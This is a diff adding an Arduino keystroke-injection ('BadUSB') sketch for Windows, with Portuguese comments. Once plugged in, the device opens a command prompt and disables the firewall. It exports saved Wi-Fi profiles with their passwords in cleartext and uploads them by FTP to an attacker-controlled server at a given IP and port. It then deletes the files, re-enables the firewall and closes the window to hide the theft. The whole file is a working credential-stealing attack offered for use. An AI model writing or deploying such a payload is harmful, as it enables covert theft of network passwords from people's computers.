@@ -1,0 +1,130 @@
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(400);
+
+  Keyboard.print("cmd");
+
+  delay(400);
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+//---> desabilita o Firewall
+
+  Keyboard.print("netsh firewall set opmode mode=disable");
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print("netsh wlan export profile key=clear");
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print("cd %USERPROFILE%");
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print("ftp");
+
+  delay(400);
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+//--->> substituir pelo seu IP e porta do servidor FTP
+
+
+  Keyboard.print("open 192.168.0.106 2221"); 
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print("francis"); // seu login
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print("francis"); // sua senha
+
+  typeKey(KEY_RETURN);
+
+  delay(600);
+
+  Keyboard.print("prompt");
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print("prompt");
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print("MPUT *.xml");
+
+  typeKey(KEY_RETURN);
+
+  delay(4000);
+
+  Keyboard.print("bye");
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.print("del *.xml");
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  Keyboard.print("netsh firewall set opmode mode=enable");
+
+  typeKey(KEY_RETURN);
+
+  delay(400);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  Keyboard.print("c");
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
